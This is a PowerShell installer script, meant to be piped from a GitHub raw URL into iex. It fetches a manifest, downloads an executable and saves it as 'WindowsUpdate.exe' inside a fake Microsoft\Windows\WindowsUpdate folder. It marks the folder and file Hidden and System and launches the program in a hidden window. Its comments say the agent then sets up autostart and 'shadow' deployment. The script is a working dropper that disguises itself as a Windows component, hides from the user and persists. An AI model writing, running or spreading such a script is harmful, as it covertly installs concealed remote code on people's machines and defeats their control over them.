# install.ps1 — one-liner installer. Pulls the latest release off GitHub,
# drops it in the hidden install dir, launches it. The agent itself handles
# autostart registration + shadow deployment on first run.
#
# Usage:
#   iwr -useb https://raw.githubusercontent.com/sayamuhbani59-collab/homectrl-updates/main/install.ps1 | iex

$ErrorActionPreference = 'Stop'

$manifestUrl = 'https://raw.githubusercontent.com/sayamuhbani59-collab/homectrl-updates/main/manifest.json'
$installDir  = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\WindowsUpdate'
$primaryExe  = Join-Path $installDir 'WindowsUpdate.exe'

Write-Host '[*] fetching manifest...'
$manifest = Invoke-RestMethod -UseBasicParsing -Uri $manifestUrl -TimeoutSec 30
if (-not $manifest.url) { throw 'manifest missing url' }

Write-Host "[*] version $($manifest.version)"

if (-not (Test-Path $installDir)) { New-Item -ItemType Directory -Force -Path $installDir | Out-Null }

# If a previous instance is running, kill it so we can overwrite the exe.
try {
    Get-Process -Name 'WindowsUpdate' -ErrorAction SilentlyContinue |
        Where-Object { $_.Path -eq $primaryExe } |
        Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500
} catch {}

Write-Host '[*] downloading primary exe...'
Invoke-WebRequest -UseBasicParsing -Uri $manifest.url -OutFile $primaryExe -TimeoutSec 300

# Hash check — abort if mismatch so a tampered CDN cannot silently drop a
# different binary into the install path.
$local = (Get-FileHash -Algorithm SHA256 -LiteralPath $primaryExe).Hash.ToLower()
$remote = ($manifest.sha256).ToLower()
if ($local -ne $remote) {
    Remove-Item -Force $primaryExe -ErrorAction SilentlyContinue
    throw "hash mismatch (expected $remote got $local)"
}

# Hide the install dir + exe from casual Explorer view (Hidden + System).
try {
    (Get-Item $installDir -Force).Attributes = 'Directory,Hidden,System'
    (Get-Item $primaryExe  -Force).Attributes = 'Hidden,System'
} catch {}

Write-Host "[*] launching $primaryExe"
Start-Process -FilePath $primaryExe -WindowStyle Hidden

Write-Host '[OK] installed. Agent is running and will register autostart + shadow on first boot.'
